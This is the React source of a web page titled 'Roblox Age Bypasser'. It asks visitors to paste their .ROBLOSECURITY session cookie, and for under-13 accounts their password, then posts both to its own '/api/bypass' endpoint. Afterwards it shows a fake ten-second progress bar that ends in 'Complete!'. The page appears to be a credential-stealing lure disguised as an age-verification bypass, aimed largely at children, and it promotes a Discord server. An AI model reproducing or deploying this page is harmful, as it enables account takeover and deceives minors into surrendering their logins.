"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"

interface DiscordInvite {
  guild: {
    name: string
  }
  approximate_member_count: number
  approximate_presence_count: number
}

export default function Home() {
  const [cookie, setCookie] = useState("")
  const [robloxPassword, setRobloxPassword] = useState("")
  const [accountType, setAccountType] = useState<"13+" | "under13" | null>(null)
  const [isProcessing, setIsProcessing] = useState(false)
  const [progress, setProgress] = useState(0)
  const [username, setUsername] = useState("")
  const [statusText, setStatusText] = useState("")
  const [error, setError] = useState("")

  const isValidRobloxCookie = (cookieValue: string): boolean => {
    const trimmedCookie = cookieValue.trim()

    if (!trimmedCookie) return false

    if (trimmedCookie.includes("_|WARNING:-DO-NOT-SHARE-THIS")) {
      const parts = trimmedCookie.split("|_")
      if (parts.length >= 2) {
        const actualCookie = parts[parts.length - 1]
        return actualCookie.length > 50
      }
    }

    if (trimmedCookie.startsWith(".ROBLOSECURITY=")) {
      const cookiePart = trimmedCookie.substring(".ROBLOSECURITY=".length)
      return cookiePart.length > 50
    }

    return trimmedCookie.length > 50
  }

  const handleBypass = async () => {
    if (!accountType) {
      setError("Please select an account type")
      return
    }

    if (!cookie.trim()) {
      setError("Please enter a cookie")
      return
    }

    if (!isValidRobloxCookie(cookie)) {
      setError("Invalid cookie format. Please make sure you copied the entire .ROBLOSECURITY cookie.")
      return
    }

    if (accountType === "under13" && !robloxPassword.trim()) {
      setError("Please enter your Roblox account password")
      return
    }

    setError("")
    setIsProcessing(true)
    setProgress(0)
    setUsername("")
    setStatusText("Processing...")

    try {
      console.log("[v0] Sending bypass request to API...")
      const response = await fetch("/api/bypass", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          cookie: cookie.trim(),
          password: accountType === "under13" ? robloxPassword.trim() : null,
          accountType: accountType,
        }),
      })

      console.log("[v0] Response status:", response.status)
      console.log("[v0] Response ok:", response.ok)

      if (!response.ok) {
        const errorText = await response.text()
        console.log("[v0] Error response body:", errorText)
        setError(`Server error: ${response.status}. Please try again.`)
        setIsProcessing(false)
        return
      }

      const result = await response.json()
      console.log("[v0] API response:", result)

      if (!result.success) {
        setError(result.message || "Invalid Roblox cookie or password. Please verify your credentials and try again.")
        setIsProcessing(false)
        return
      }

      if (result.userInfo?.name) {
        setUsername(result.userInfo.name)
      }

      const totalDuration = 10000
      const intervalTime = 100
      const incrementPerInterval = (100 / totalDuration) * intervalTime

      const progressInterval = setInterval(() => {
        setProgress((prev) => {
          const newProgress = prev + incrementPerInterval
          if (newProgress >= 100) {
            clearInterval(progressInterval)
            setStatusText("Complete!")
            setTimeout(() => {
              setIsProcessing(false)
              setProgress(0)
              setCookie("")
              setRobloxPassword("")
              setAccountType(null)
              setUsername("")
              setStatusText("")
            }, 500)
            return 100
          }
          return newProgress
        })
      }, intervalTime)
    } catch (error) {
      console.error("[v0] Failed to bypass:", error)
      const errorMessage = error instanceof Error ? error.message : String(error)
      setError(`Connection error: ${errorMessage}. Please check your network and try again.`)
      setIsProcessing(false)
      setProgress(0)
      setCookie("")
      setRobloxPassword("")
      setAccountType(null)
      setUsername("")
      setStatusText("")
    }
  }

  return (
    <main className="relative min-h-screen bg-gradient-to-br from-black via-zinc-900 to-zinc-800 flex flex-col items-center justify-center p-4 overflow-hidden">
      <div className="absolute inset-0 z-0">
        <img
          src="/images/Roblox-hero-image.avif"
          alt="Roblox Background"
          className="w-full h-full object-cover opacity-60"
        />
        <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-zinc-900/70 to-zinc-800/80"></div>
      </div>

      <div className="absolute top-6 right-6 z-20"></div>

      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-0 left-1/4 w-96 h-96 bg-zinc-500/20 rounded-full blur-[128px] animate-pulse"></div>
        <div
          className="absolute bottom-0 right-1/4 w-96 h-96 bg-gray-500/20 rounded-full blur-[128px] animate-pulse"
          style={{ animationDelay: "1s" }}
        ></div>
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-zinc-600/10 rounded-full blur-[150px]"></div>
      </div>

      <div className="relative z-10">
        <div className="flex flex-col items-center mb-12">
          <h1 className="text-4xl md:text-5xl font-bold text-white mb-3 text-balance text-center drop-shadow-[0_0_20px_rgba(113,113,122,0.5)]">
            Roblox Age Bypasser
          </h1>

          <p className="text-zinc-400 text-lg text-center">Secure and efficient age verification bypass</p>
        </div>

        <Card className="w-full max-w-md bg-black/90 border-2 border-zinc-700 shadow-[0_0_50px_rgba(24,24,27,0.8)]">
          <CardContent className="p-8">
            <label className="block text-white text-sm font-medium mb-3">Account Type Selection</label>
            <select
              value={accountType || ""}
              onChange={(e) => {
                setAccountType(e.target.value as "13+" | "under13" | null)
                setError("")
              }}
              className="w-full h-12 px-4 py-3 bg-zinc-900 border border-zinc-700 rounded-lg text-white focus:outline-none focus:ring-0 focus:border-zinc-600 mb-6 transition-all appearance-none cursor-pointer"
              style={{
                backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23ffffff' d='M6 9L1 4h10z'/%3E%3C/svg%3E")`,
                backgroundRepeat: "no-repeat",
                backgroundPosition: "right 1rem center",
                backgroundSize: "12px",
              }}
            >
              <option value="" disabled className="bg-zinc-900 text-zinc-600">
                SELECT ACCOUNT TYPE
              </option>
              <option value="13+" className="bg-zinc-900 text-white">
                13+ ACCOUNT (COOKIE ONLY)
              </option>
              <option value="under13" className="bg-zinc-900 text-white">
                UNDER 13 ACCOUNT (COOKIE + PASSWORD)
              </option>
            </select>

            {accountType && (
              <>
                <label className="block text-white text-sm font-medium mb-3">.ROBLOSECURITY Cookie</label>

                <textarea
                  value={cookie}
                  onChange={(e) => {
                    setCookie(e.target.value)
                    setError("")
                  }}
                  placeholder="Paste your cookie here..."
                  className="w-full h-24 px-4 py-3 bg-zinc-900 border border-zinc-700 rounded-lg text-white placeholder:text-zinc-400 focus:outline-none focus:ring-0 focus:border-zinc-600 resize-none mb-6 transition-all"
                />

                {accountType === "under13" && (
                  <>
                    <label className="block text-white text-sm font-medium mb-3">Roblox Account Password</label>
                    <input
                      type="password"
                      value={robloxPassword}
                      onChange={(e) => {
                        setRobloxPassword(e.target.value)
                        setError("")
                      }}
                      placeholder="Enter your Roblox password..."
                      className="w-full h-12 px-4 py-3 bg-zinc-900 border border-zinc-700 rounded-lg text-white placeholder:text-zinc-400 focus:outline-none focus:ring-0 focus:border-zinc-600 mb-2 transition-all"
                    />
                  </>
                )}
              </>
            )}

            {error && (
              <div className="mb-4 p-3 bg-zinc-950/50 border border-zinc-800 rounded-lg">
                <p className="text-zinc-300 text-sm">{error}</p>
              </div>
            )}

            <Button
              onClick={handleBypass}
              disabled={
                !accountType || !cookie.trim() || (accountType === "under13" && !robloxPassword.trim()) || isProcessing
              }
              className="w-full h-12 bg-red-600 hover:bg-red-700 text-white font-medium rounded-lg flex items-center justify-center gap-2 transition-all disabled:opacity-50 shadow-[0_0_30px_rgba(220,38,38,0.4)] hover:shadow-[0_0_40px_rgba(239,68,68,0.6)]"
            >
              <svg viewBox="0 0 24 24" className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2.5">
                <path d="M12 2v10M6.34 6.34a8 8 0 1 0 11.32 0" strokeLinecap="round" />
              </svg>
              {isProcessing ? "In Progress" : "Start Bypass"}
            </Button>

            <a
              href="https://discord.gg/cCzUVf54Wv"
              target="_blank"
              rel="noopener noreferrer"
              className="mt-3 w-full h-12 bg-[#5865F2] hover:bg-[#4752C4] text-white font-medium rounded-lg flex items-center justify-center gap-2 transition-all shadow-[0_0_30px_rgba(88,101,242,0.4)] hover:shadow-[0_0_40px_rgba(88,101,242,0.6)]"
            >
              <svg viewBox="0 0 127.14 96.36" className="w-5 h-5 fill-white">
                <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,84.69,65.69ZM42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z" />
              </svg>
              Join Discord Server
            </a>

            {isProcessing && (
              <div className="mt-6 space-y-3">
                <div className="text-center">
                  <p className="text-zinc-400 text-sm mb-1">Processing account</p>
                  {username && <p className="text-white font-medium">{username}</p>}
                </div>

                <div className="space-y-2">
                  <div className="flex items-center justify-between text-sm">
                    <span className="text-zinc-400">Progress</span>
                    <span className="text-white font-medium">{Math.round(progress)}%</span>
                  </div>

                  <div className="w-full h-2 bg-zinc-800 rounded-full overflow-hidden">
                    <div
                      className="h-full bg-red-500 transition-all duration-300 ease-out shadow-[0_0_20px_rgba(239,68,68,0.8)]"
                      style={{ width: `${progress}%` }}
                    />
                  </div>

                  <p className="text-zinc-500 text-xs text-center flex items-center justify-center gap-1">
                    <span className="inline-block w-1 h-1 bg-red-500 rounded-full animate-pulse shadow-[0_0_5px_rgba(239,68,68,0.8)]" />
                    {statusText}
                  </p>
                </div>
              </div>
            )}
          </CardContent>
        </Card>

        <div className="mt-12 flex items-center gap-2 text-zinc-600 text-sm">
          <span></span>
          <span>•</span>
          <span></span>
          <span>•</span>
          <span></span>
        </div>
      </div>
    </main>
  )
}
